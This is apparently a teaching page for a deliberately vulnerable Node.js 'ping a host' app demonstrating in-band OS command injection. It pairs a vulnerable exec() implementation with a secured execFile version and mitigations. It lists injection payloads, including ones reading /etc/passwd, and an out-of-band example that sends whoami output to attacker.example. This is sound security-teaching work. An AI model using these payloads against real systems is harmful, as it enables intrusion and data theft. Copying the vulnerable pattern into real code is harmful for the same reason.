OS Command Injection — in-band variant

A "ping a host" tool. The vulnerable version builds a shell command by string concatenation; the secured version does not. Both run the same feature so the same payload can be shown working, then blocked.

Vulnerable Secured Write-up
Intentionally vulnerable application. Run it on localhost only. Test only this app.

1. Vulnerable endpoint

Enter a host to ping. Then try an injection payload, e.g. 127.0.0.1; id or 127.0.0.1 && cat /etc/passwd.



  
2. Secured endpoint

  
Same feature, with the mitigation applied. The exact payload that worked
  above now fails here.

  

    
    
  

  


  
3. Write-up


  
(a) Vulnerable implementation

  
In server.js, route POST /vulnerable/ping:

  
const cmd = `ping -c 1 ${host}`;   // user input concatenated into a shell string
exec(cmd, ...);                    // exec() runs this via /bin/sh -c


  
(b) Working exploit

  
Because the string is run by a shell, shell metacharacters let the attacker
  append commands. The output comes back in the HTTP response, which is what makes
  this the in-band variant.

  
127.0.0.1; id                 -> runs ping, then id
127.0.0.1 && whoami           -> runs whoami if ping succeeds
127.0.0.1 | ls -la            -> pipes ping output into ls
$(uname -a)                   -> command substitution
`cat /etc/passwd`             -> backtick substitution

  
On Windows cmd.exe, use & as the separator, e.g.
  127.0.0.1 & whoami.


  
(c) Root cause

  
Untrusted user input is concatenated into a command string that is then
  interpreted by a shell. The shell treats ; && | ` $() as
  syntax, not as data, so the attacker's text becomes new commands that run with
  the web server process's privileges.


  
(d) Mitigation implemented

  
The secured route replaces exec (which spawns a shell) with
  execFile and an explicit argument vector:

  
execFile('ping', ['-c', '1', '--', host], ...);

  
No shell is involved, so metacharacters in host are passed to
  ping as one literal argument and are never interpreted. A payload
  like 127.0.0.1; id is handed to ping as a single hostname, which
  simply fails name resolution — id never runs. A second layer, an
  allow-list regex /^[A-Za-z0-9.-]{1,253}$/, rejects the payload
  before execution and is the easiest "blocked attempt" screenshot for the viva.
  The -- stops ping from reading a value starting with -
  as an option.


  
(e) Other mitigations (theory)

  

    
MitigationWhy it works

    

      Avoid the shell / argument vector (implemented)
      The command binary receives arguments directly. With no shell to parse
      them, metacharacters have no special meaning and cannot start new commands.
    

    

      Allow-list input validation (also implemented as a layer)
      Only known-good characters/patterns (e.g. a valid hostname or IPv4) are
      accepted; everything else is rejected. Deny-lists are avoided because they
      are easy to bypass with an overlooked character or encoding.
    

    

      Least privilege
      Run the app as an unprivileged user, in a container or chroot with a
      minimal filesystem and no outbound network. If injection still occurs, the
      blast radius is contained.
    

    

      Prefer a native library over shelling out
      Use a language/library API for the task (name resolution, ICMP, file
      ops) instead of invoking an external command at all, removing the shell
      from the picture entirely.
    

    

      Safe errors and output handling
      Don't echo raw command output or shell errors back to the user; this
      limits information leakage and makes blind exploitation harder.
    

  


  
The other variant (blind), for context

  
If the app did not return command output, the same flaw is exploited
  blind: time-based, e.g. 127.0.0.1; sleep 5 and observe the
  delayed response; or out-of-band, e.g. 127.0.0.1; curl
  http://attacker.example/$(whoami) and observe the DNS/HTTP callback. Same
  root cause, same mitigations. This project implements the in-band variant.
